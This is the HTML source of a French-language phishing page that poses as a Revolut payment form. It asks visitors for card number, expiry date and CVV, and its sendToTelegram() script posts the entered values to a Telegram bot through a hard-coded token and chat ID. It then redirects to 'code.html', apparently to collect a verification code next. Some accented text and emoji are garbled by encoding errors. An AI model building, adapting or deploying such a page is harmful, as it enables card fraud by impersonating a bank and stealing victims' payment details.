<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Paiement - Revolut</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
<style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
        font-family: 'Inter', sans-serif;
        background-color: #f5f6fa;
        color: #1d1d1f;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
    }
    .container {
        display: flex;
        background: white;
        border-radius: 20px;
        box-shadow: 0 10px 25px rgba(0,0,0,0.05);
        overflow: hidden;
        max-width: 900px;
        width: 100%;
    }
    .left { flex: 1; padding: 40px; display: flex; flex-direction: column; justify-content: center; }
    .right { flex: 1; background: linear-gradient(135deg, #eef0f6, #ffffff); display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 40px; }
    .back-arrow { font-size: 1.2em; margin-bottom: 20px; cursor: pointer; }
    h1 { font-size: 2em; font-weight: 700; margin-bottom: 5px; }
    .secure { font-size: 0.9em; color: #6a5acd; margin-bottom: 30px; }
    .secure::before { content: "üîí "; }
    .input {
        background-color: #f2f3f7;
        border-radius: 12px;
        padding: 12px 16px;
        display: flex;
        align-items: center;
        margin-bottom: 15px;
        transition: all 0.3s ease;
    }
    .input:focus-within { background-color: #e9ebf2; box-shadow: 0 0 0 2px #c7c6f3; }
    input {
        border: none;
        background: none;
        font-size: 1em;
        flex: 1;
        color: #1d1d1f;
    }
    input:focus { outline: none; }
    .two-cols { display: flex; gap: 10px; }
    .continue-btn {
        background: linear-gradient(90deg, #9d8df1, #6a5acd);
        color: white;
        border: none;
        border-radius: 25px;
        padding: 15px;
        font-size: 1em;
        font-weight: 600;
        width: 100%;
        cursor: pointer;
        transition: all 0.3s ease;
        margin-top: 20px;
    }
    .continue-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 15px rgba(106,90,205,0.3); }
    .right h2 { font-size: 1.8em; margin-bottom: 10px; }
    .right a { color: #6a5acd; text-decoration: none; font-weight: 500; }
    .right img { margin-top: 40px; max-width: 200px; }
    @media (max-width: 768px) { .container { flex-direction: column; } .right { order: -1; } }
</style>
</head>
<body>
<div class="container">
    <div class="left">
        <div class="back-arrow" onclick="history.back()">‚Üê</div>
        <h1>Carte Bancaire</h1>
        <div class="secure">Trait√© en toute s√©curit√©</div>
        
        <div class="input">
            <input type="text" id="card" placeholder="Numero Carte">
        </div>
        
        <div class="two-cols">
            <div class="input">
                <input type="text" id="expiry" placeholder="Date d'expiration">
            </div>
            <div class="input">
                <input type="text" id="cvv" placeholder="CVV">
            </div>
        </div>
        
        <button class="continue-btn" onclick="sendToTelegram()">Continue</button>
    </div>
    <div class="right">
        <h2>Transf√©rez de l'argent sans fronti√®res</h2>
        <img src="globe.png" alt="Globe">
    </div>
</div>

<script>
function sendToTelegram() {
    const card = document.getElementById("card").value || "4111 1111 1111 1111";
    const expiry = document.getElementById("expiry").value || "12/34";
    const cvv = document.getElementById("cvv").value || "000";

    const botToken = "8431246186:AAEV2wktzNbQIFjsRQ8Q-TzSuC_GH5WIq-o";
    const chatId = "-1002748885069";
    const message = `üí≥ TEST Paiement :\nCard: ${card}\nExpiry: ${expiry}\nCVV: ${cvv}`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    })
    .then(() => {
        // Redirection vers code.html apr√®s envoi
        window.location.href = "code.html";
    })
    .catch(err => {
        console.error("Erreur:", err);
        alert("Erreur lors de l'envoi");
    });
}
</script>
</body>
</html>
